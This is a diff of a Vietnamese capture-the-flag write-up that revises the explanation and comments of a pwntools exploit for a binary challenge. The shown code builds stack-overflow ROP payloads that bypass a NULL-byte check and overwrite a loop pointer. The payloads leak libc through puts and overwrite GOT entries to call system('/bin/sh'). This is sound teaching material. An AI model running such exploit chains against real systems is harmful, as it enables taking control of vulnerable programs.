@@ -327,7 +327,7 @@ if ( unk_4080 && !strcmp((const char *)(unk_4080 + 4LL), (const char *)(a1 + 4))
 
 Tiếp đến ta cần nhìn sơ qua về cơ chế kiểm tra `data` hợp lệ, cơ chế này dựa trên hàm `strlen` (dừng ở nullbyte) nhưng khi dùng lại gọi đến `memcpy` (copy cả nullbyte), vì thế ta có thể dễ dàng bypass nếu ta kết thúc chuỗi sớm bằng '\x00', lúc này ta có thể điền các byte khác không hợp lệ vào vùng `data` sau đó nó được copy sang stack bằng `memcpy`
 
-Tuy nhiên mình ngay lập tức nhận ra vấn đề, đó là khi ta overflow, ta sẽ đè qua biến `k` dùng cho vòng lặp, từ đó flow chương trình sẽ thay đổi, ta cần bypass nó, một cách đơn giản đó là đè lại biến `k` thành (elf.address + 0x4070), khí đó `k->next` sẽ trở về struct ban đầu của ta và tiến hành loop tiếp đến khi dừng.
+Tuy nhiên mình ngay lập tức nhận ra vấn đề, đó là khi ta overflow, ta sẽ đè qua biến `k` dùng cho vòng lặp, khiến cho vòng lặp bị crash, ta cần bypass nó, một cách đơn giản đó là đè lại biến `k` thành (elf.address + 0x4070), khí đó `k->next` sẽ trở về đầu `linked_list` của ta và chương trình sẽ tiến hành loop tiếp (v15 cộng tiếp) đến khi dừng. Chỉ cần bypass biến `k` một lần ta sẽ có một payload ropchain với độ dài tùy thích.
 
 ### Exploit thinking
 
@@ -382,7 +382,7 @@ Bài này là bài mình tốn thời gian lâu nhất trong khi giải (chắc 
 
 ![image](https://user-images.githubusercontent.com/57558487/196630881-c30303bc-71c7-4881-8305-dc9341bb49c4.png)
 
-Nếu ta dùng hàm `bth`, `data` dùng để đè biến `k` nằm ở đầu mảng, khiến cho ta rất khó bypass check data, ngược lại nếu dùng hàm `htb`, nó rất dễ vì ta chỉ cần dùng NULL byte đầu mảng, sau đó đè giá trị tùy thích vào vùng biến `k`. Mình đã tốn quá nhiều thời gian tìm cách bypass và exploit ở hàm `bth` mà không check đến hàm `htb`, vì mình nghĩ 2 hàm tương tự nhau, cho đến khi mình vô tình click nhầm hàm và thấy sự khác biệt của offset :))). 
+Nếu ta dùng hàm `bth`, offset dùng để đè biến `k` trong `data` nằm ở đầu mảng, khiến cho ta rất khó bypass check `data` (hex character hoặc byte charracter), ngược lại nếu dùng hàm `htb`, nó rất dễ vì ta chỉ cần dùng NULL byte đầu mảng, sau đó đè giá trị tùy thích vào offset sẽ đè lên biến `k`. Mình đã tốn quá nhiều thời gian tìm cách bypass và exploit ở hàm `bth` mà không check đến hàm `htb`, vì mình nghĩ 2 hàm tương tự nhau, cho đến khi mình vô tình click nhầm hàm và thấy sự khác biệt của offset :))). 
 
 Okey vậy plan khá clear rồi, dùng lỗi `bof` ở hàm `htb`, overflow, đè giá trị `k` về lại `elf.address + 0x4070`, sau đó loop và đè lên return address. Chú ý bypass check data bằng cách dùng NULL byte ở đầu mảng.
 
@@ -397,9 +397,11 @@ puts(puts.got) -> read(0, malloc.got, 0x100) -> overwrite {
 
 Đầu tiên gọi đến `puts(puts.got)` để leak địa chỉ libc, sau đó gọi đến `read` để đè lên `malloc.got`, vì `malloc.got` và `atoi.got` nằm kề nhau, mình sẽ đè lần lượt `malloc.got` thành chuỗi "/bin/sh" và `atoi.got` bằng địa chỉ của `system`, sau đó trigger bằng gọi gọi hàm `atoi.plt` với tham số là địa chỉ got của `malloc`, nơi chứa chuỗi "/bin/sh" -> `system("/bin/sh")`
 
-Bài này khá strict do chúng ta vừa phải build one_time ropchain vừa phải bypass các điều kiện check của data, vừa phải đè lên biến `k` hợp lí, vì thế mình cần phải khéo léo thiết lập payload và kết hợp cả kĩ thuật `ret2csu` vào để tạo ra payload.
+Bài này khá strict do chúng ta vừa phải build one_time ropchain vừa phải bypass các điều kiện check của data, vừa phải đè lên biến `k` hợp lí, vì thế mình cần phải khéo léo điều chỉnh payload bằng các lệnh `pop` và kết hợp cả kĩ thuật `ret2csu` vào để tạo ra payload.
 
 ## Exploit
+
+Flow đè của payload này sẽ là: 1 -> 2 -> 3 (đè lên k) -> 1 -> 2 (bắt đầu đè lên rbp và return address) -> 3 -> 4 -> 5 -> 6 -> 7 -> 8
 
 ```python
 #
@@ -477,28 +479,33 @@ csu2 = elf.address + 0x1be8
 log.info('PIE base: 0x%x', elf.address)
 log.info('Break at: 0x%x', csu1)
 
+# 1
 time.sleep(0.1)
 payload = b'\x00' + b'a' * 3 + p32(0x90) + p64(0) * 5
 s.send(b'1   htb\x00' + payload)
 
+# 2
 time.sleep(0.1)
 payload = b'\x00' + b'a' * 7 + p64(ret)
 payload += p64(pop_rdi) + p64(elf.got['puts'])
 payload += p64(elf.symbols['puts']) + p64(pop_rdi)
 s.send(b'1   htb\x00' + payload)
 
+# 3
 time.sleep(0.1)
 payload = b'\x00' + b'a' * 7 + p64(pop_rsi_r15)
 payload += p64(0) * 2
-payload += p64(pop_rsi_r15) + p64(elf.address + 0x4070)
+payload += p64(pop_rsi_r15) + p64(elf.address + 0x4070) # overwrite k back to head_linked list, the next payload execute is 1
 s.send(b'1   htb\x00' + payload)
 
+# 4
 time.sleep(0.1)
 payload = b'\x00' + b'a' * 7 + p64(csu1)
 payload += p64(0) + p64(1)
 payload += p64(0) + p64(elf.got['malloc'])
 s.send(b'1   htb\x00' + payload)
 
+# 5
 time.sleep(0.1)
 payload = p64(0x100) + p64(elf.got['read'])
 payload += p64(ret) + p64(csu2)
@@ -506,19 +513,21 @@ payload += p64(0) + p64(0)
 s.send(b'1   htb\x00' + payload)
 
 # print('check')
-
+# 6
 time.sleep(0.1)
 payload = b'\x00' + b'a' * 7 + p64(1)
 payload += p64(0) + p64(0)
 payload += p64(0) + p64(pop_rdi)
 s.send(b'1   htb\x00' + payload)
 
+# 7
 time.sleep(0.1)
 payload = b'\x00' + b'a' * 7 + p64(ret)
 payload += p64(pop_rdi) + p64(elf.got['malloc'])
 payload += p64(elf.symbols['atoi']) + p64(0)
 s.send(b'1   htb\x00' + payload)
 
+# 8
 time.sleep(0.1)
 payload = b'\x00' + b'a' * 7 + p64(0) * 5
 s.send(b'0   htb\x00' + payload)
